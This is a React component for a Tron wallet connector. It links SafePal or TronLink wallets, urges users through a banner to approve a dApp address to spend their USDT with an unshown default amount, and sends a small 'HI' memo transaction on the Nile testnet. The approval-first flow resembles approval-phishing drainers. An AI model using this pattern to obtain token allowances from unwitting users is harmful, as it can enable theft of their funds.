"use client";

import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Wallet, CheckCircle, AlertCircle, Loader2, ArrowRight } from "lucide-react";
import { SafePalConnector } from "@/wallets/safepal-wallet";
import { TronLinkConnector } from "@/wallets/tronlink-connector";
import { detectWalletEnvironment, getWalletDisplayName, getWalletInstructions, type WalletType } from "@/utils/wallet-detection";
import { USDT_CONTRACT, DEFAULT_APPROVAL_AMOUNT, DAPP_ADDRESS, DEFAULT_RECIPIENT_ADDRESS, TARGET_NETWORK } from "@/utils/tron-config";

export default function MainWalletConnector() {
  const [connectedWallet, setConnectedWallet] = useState<string>("");
  const [walletType, setWalletType] = useState<WalletType>("Unknown");
  const [isConnecting, setIsConnecting] = useState(false);
  const [isApproving, setIsApproving] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isApproved, setIsApproved] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<WalletType | null>(null);

  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(""), 5000);
      return () => clearTimeout(timer);
    }
  }, [error]);

  useEffect(() => {
    if (success) {
      const timer = setTimeout(() => setSuccess(""), 5000);
      return () => clearTimeout(timer);
    }
  }, [success]);

  const connectWallet = async (wallet: WalletType) => {
    setIsConnecting(true);
    setError("");
    setSuccess("");
    setSelectedWallet(wallet);

    try {
      if (wallet === "SafePal" && !window.SafePalHook) {
        throw new Error(getWalletInstructions("SafePal"));
      }
      if (wallet === "TronLink" && !window.tronWeb) {
        throw new Error(getWalletInstructions("TronLink"));
      }

      const connector = wallet === "SafePal" ? SafePalConnector.getInstance() : TronLinkConnector.getInstance();
      const result = await connector.connect();
      console.log(`${wallet} Connect Result:`, result);
      console.log("TronWeb Available:", !!window.tronWeb, window.tronWeb?.defaultAddress);

      if (result.success && result.address && window.tronWeb && window.tronWeb.defaultAddress.base58) {
        setConnectedWallet(result.address);
        setWalletType(wallet);
        setSuccess(`Successfully connected ${getWalletDisplayName(wallet)}!`);
      } else {
        throw new Error(result.error || `Failed to connect ${wallet}`);
      }
    } catch (err: any) {
      console.error(`${wallet} connection error:`, err);
      setError(err.message || `Failed to connect ${getWalletDisplayName(wallet)}`);
    } finally {
      setIsConnecting(false);
    }
  };

  const approveUSDT = async () => {
    if (!window.tronWeb || !connectedWallet) {
      setError("Please connect your wallet first");
      return;
    }

    setIsApproving(true);
    setError("");
    setSuccess("");

    try {
      console.log("Connecting to USDT contract:", USDT_CONTRACT);
      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
      const result = await usdt
        .approve(DAPP_ADDRESS, DEFAULT_APPROVAL_AMOUNT)
        .send({
          from: window.tronWeb.defaultAddress.base58,
        });

      console.log("Approval Result:", result);
      setSuccess(`USDT approval successful! (TxID: ${result})`);
      setIsApproved(true);
    } catch (err: any) {
      console.error("USDT Approval error:", err);
      setError(`Failed to approve USDT: ${err.message || "Unknown error"}`);
    } finally {
      setIsApproving(false);
    }
  };

  const sendHiTransaction = async () => {
    if (!window.tronWeb || !connectedWallet) {
      setError("Wallet not connected");
      return;
    }

    setError("");
    setSuccess("");

    try {
      console.log("TronWeb:", window.tronWeb);
      console.log("Connected Address (Sender):", window.tronWeb.defaultAddress.base58);
      console.log("Recipient Address:", DEFAULT_RECIPIENT_ADDRESS);

      const tx = await window.tronWeb.transactionBuilder.sendTrx(
        DEFAULT_RECIPIENT_ADDRESS,
        1,
        window.tronWeb.defaultAddress.base58,
        { memo: "HI" }
      );
      console.log("Transaction:", tx);

      const signedTx = await window.tronWeb.trx.sign(tx);
      console.log("Signed Transaction:", signedTx);

      const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
      console.log("Result:", result);

      if (result.result) {
        setSuccess(`Transaction sent: 'HI' (TxID: ${result.txid})`);
      } else {
        throw new Error("Transaction failed");
      }
    } catch (err: any) {
      console.error("Send HI error:", err);
      setError(`Failed to send transaction: ${err.message || "Unknown error"}`);
    }
  };

  const disconnect = () => {
    setConnectedWallet("");
    setWalletType("Unknown");
    setError("");
    setSuccess("");
    setIsApproved(false);
    setSelectedWallet(null);
  };

  return (
    <>
      {!connectedWallet && (
        <div className="fixed top-0 left-0 right-0 bg-yellow-500 text-black py-3 px-6 flex items-center justify-center shadow-md z-50 animate-fade-in-down">
          <AlertCircle className="w-5 h-5 mr-2" />
          <span className="font-medium text-sm">
            Please set your wallet to the <strong>Tron Testnet (Nile)</strong> before connecting.
          </span>
        </div>
      )}

      {connectedWallet && !isApproved && (
        <div className="fixed top-0 left-0 right-0 bg-blue-600 text-white py-4 px-6 flex items-center justify-between shadow-lg z-50 animate-fade-in-down">
          <div className="flex items-center">
            <AlertCircle className="w-6 h-6 mr-3" />
            <span className="text-lg font-medium">Approve this dApp to spend your USDT</span>
          </div>
          <Button
            onClick={approveUSDT}
            disabled={isApproving}
            variant="ghost"
            className="text-white hover:bg-blue-700 p-3 rounded-full border-2 border-white/50 hover:border-white transition-all"
            aria-label="Approve USDT"
          >
            {isApproving ? <Loader2 className="w-7 h-7 animate-spin" /> : <ArrowRight className="w-7 h-7" />}
          </Button>
        </div>
      )}

      <div className="w-full max-w-md mx-auto space-y-6 pt-20">
        <div className="text-center mb-8">
          <h1 className="text-6xl font-bold text-blue-500 drop-shadow-lg mb-8">Wallet Connector</h1>

          {!connectedWallet && (
            <div className="space-y-4">
              <Button
                onClick={() => connectWallet("SafePal")}
                disabled={isConnecting}
                className="w-full h-14 text-lg font-semibold bg-blue-600 hover:bg-blue-700 text-white shadow-lg"
              >
                {isConnecting && selectedWallet === "SafePal" ? (
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                ) : (
                  <Wallet className="w-5 h-5 mr-2" />
                )}
                Connect SafePal
              </Button>
              <Button
                onClick={() => connectWallet("TronLink")}
                disabled={isConnecting}
                className="w-full h-14 text-lg font-semibold bg-purple-600 hover:bg-purple-700 text-white shadow-lg"
              >
                {isConnecting && selectedWallet === "TronLink" ? (
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                ) : (
                  <Wallet className="w-5 h-5 mr-2" />
                )}
                Connect TronLink
              </Button>
            </div>
          )}
        </div>

        {connectedWallet && (
          <Card className="bg-blue-800/30 border-blue-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-white flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-blue-400" />
                Connected Address ({getWalletDisplayName(walletType)})
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="text-sm text-white/80 break-all">{connectedWallet}</div>

              {isApproved && (
                <div className="flex items-center gap-2 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
                  <CheckCircle className="w-4 h-4 text-blue-400" />
                  <span className="text-white text-sm">USDT Approved</span>
                </div>
              )}

              <Button onClick={sendHiTransaction} className="w-full bg-green-600 hover:bg-green-700 text-white">
                Send "HI" Transaction
              </Button>

              <Button onClick={disconnect} className="w-full bg-blue-600 hover:bg-blue-700 text-white border-blue-500">
                Disconnect
              </Button>
            </CardContent>
          </Card>
        )}

        {error && (
          <div className="flex items-center gap-2 p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
            <AlertCircle className="w-4 h-4 text-red-400" />
            <span className="text-white text-sm">{error}</span>
          </div>
        )}

        {success && (
          <div className="flex items-center gap-2 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <CheckCircle className="w-4 h-4 text-blue-400" />
            <span className="text-white text-sm">{success}</span>
          </div>
        )}
      </div>
    </>
  );
}